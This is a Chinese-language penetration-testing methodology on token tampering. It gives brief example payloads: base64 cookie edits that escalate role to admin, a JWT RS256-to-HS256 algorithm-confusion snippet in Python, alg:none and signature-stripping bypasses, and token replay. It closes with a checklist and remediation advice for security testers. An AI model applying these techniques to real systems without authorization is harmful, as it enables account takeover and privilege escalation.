# 令牌篡改攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的令牌（Token/Cookie）篡改攻击检测与利用流程。

## 1.2 适用范围

本文档适用于使用令牌进行认证和授权管理的 Web 应用和 API 接口。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

令牌篡改是指攻击者修改认证令牌（如 Cookie、JWT、Session ID）中的内容，以获取未授权的访问权限或提升权限。

**本质问题**：
- 令牌内容未签名或签名可绕过
- 敏感信息存储在客户端
- 令牌验证逻辑缺陷

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-613 | 会话过期不足 |
| CWE-614 | Cookie 中的敏感信息 |
| CWE-345 | 数据真实性验证不足 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| Cookie 认证 | 登录状态 Cookie | Cookie 值可篡改 |
| JWT 认证 | API 访问令牌 | JWT Payload 可修改 |
| 会话管理 | Session ID | 会话 ID 可预测 |
| 自定义令牌 | 访问令牌 | 令牌内容未加密 |

## 2.3 漏洞发现方法

### 2.3.1 Cookie 分析

```bash
# 检查 Cookie 内容
Set-Cookie: user_id=123; role=user; signature=abc

# 尝试修改
Cookie: user_id=1; role=admin; signature=abc

# 检查响应是否接受修改后的值
```

### 2.3.2 JWT 分析

```bash
# 解码 JWT
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"123","role":"user"}

# 尝试修改 Payload
# {"sub":"1","role":"admin"}

# 重新签名或尝试算法混淆
```

### 2.3.3 令牌结构分析

```bash
# 识别令牌格式
# Base64 编码：尝试解码
# JSON 格式：尝试修改字段
# 加密格式：尝试重放攻击
```

## 2.4 漏洞利用方法

### 2.4.1 Cookie 值篡改

```bash
# 原始 Cookie
Cookie: session=eyJ1c2VyX2lkIjogMTIzLCAicm9sZSI6ICJ1c2VyIn0=

# 解码后
{"user_id": 123, "role": "user"}

# 修改后重新编码
Cookie: session=eyJ1c2VyX2lkIjogMSwgInJvbGUiOiAiYWRtaW4ifQ==
```

### 2.4.2 JWT 算法攻击

```python
# 将 RS256 改为 HS256
import jwt

payload = {"sub": "1", "role": "admin"}
# 使用公钥作为 HMAC 密钥
token = jwt.encode(payload, public_key, algorithm='HS256')
```

### 2.4.3 令牌重放

```bash
# 捕获有效令牌
# 在令牌有效期内重复使用
# 即使用户已注销，令牌可能仍然有效
```

## 2.5 漏洞利用绕过方法

### 2.5.1 签名验证绕过

```bash
# 尝试 alg: none
# 尝试空签名
# 尝试移除签名部分
```

### 2.5.2 加密绕过

```bash
# 如果令牌仅 Base64 编码未加密
# 直接解码修改后重新编码

# 如果使用了弱加密
# 尝试解密或爆破密钥
```

---

# 第三部分：附录

## 3.1 令牌篡改测试检查清单

```
□ 分析令牌结构和内容
□ 测试 Cookie 值篡改
□ 测试 JWT 算法混淆
□ 测试 JWT 密钥爆破
□ 测试令牌重放
□ 测试签名验证绕过
□ 检查令牌过期机制
```

## 3.2 修复建议

1. **服务端状态管理** - 敏感信息存储在服务端
2. **签名验证** - 使用强签名算法
3. **令牌加密** - 敏感数据加密存储
4. **短时效令牌** - 设置合理的过期时间

---

**参考资源**：
- [OWASP Cheat Sheet: JWT Security](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
